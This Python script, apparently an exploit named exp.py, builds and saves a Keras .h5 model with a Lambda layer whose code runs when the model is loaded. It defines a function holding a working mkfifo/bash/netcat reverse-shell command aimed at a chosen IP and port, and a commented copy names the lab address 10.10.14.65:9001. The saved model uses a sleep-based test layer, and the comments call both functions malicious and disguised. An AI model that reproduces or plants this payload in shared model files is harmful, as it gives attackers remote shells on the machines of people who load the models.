import numpy as np
import pandas as pd
import tensorflow as tf
from tensorflow import keras
from tensorflow.keras import layers
import os
import sys

np.random.seed(42)

# Malicious function disguised as a preprocessing layer
def malicious_layer_sleep(second):
    # This will execute when the model is loaded
    import time
    try:
        time.sleep(int(second))  # Simulate a delay to mimic malicious behavior
    except Exception as e:
        print(f"Error: {str(e)}")
    
    # Return the input unchanged to maintain normal operation
    return second

# Malicious function disguised as a preprocessing layer
def malicious_layer(ip, port):
    # This will execute when the model is loaded
    import subprocess
    import os
    
    if os.getenv("BUILD_PAYLOAD") != "1":
        try:
            # result = subprocess.run('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc 10.10.14.65 9001 > /tmp/f', shell=True, capture_output=True, text=True)
            result = subprocess.run(f'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc {ip} {port} > /tmp/f', shell=True, capture_output=True, text=True)
        except Exception as e:
            print(f"Error: {str(e)}")
    
    # Return the input unchanged to maintain normal operation
    return ip

if len(sys.argv) < 2:
    print("Usage: python exp.py ")

# Create hourly data for a week
hours = np.arange(0, 24 * 7)
profits = np.random.rand(len(hours)) * 100

# Create a DataFrame
data = pd.DataFrame({
    'hour': hours,
    'profit': profits
})

X = data['hour'].values.reshape(-1, 1)
y = data['profit'].values

# Build the model with hidden malicious layer
model = keras.Sequential([
    layers.Lambda(malicious_layer_sleep , input_shape=(1,)),  # Malicious layer
    # layers.Dense(64, activation='relu'),
    layers.Dense(64, activation='relu'),
    layers.Dense(1)
])

# Compile the model
model.compile(optimizer='adam', loss='mean_squared_error')

# Train the model
model.fit(X, y, epochs=100, verbose=1)

# Save the model
model.save('profits_model_sleep.h5')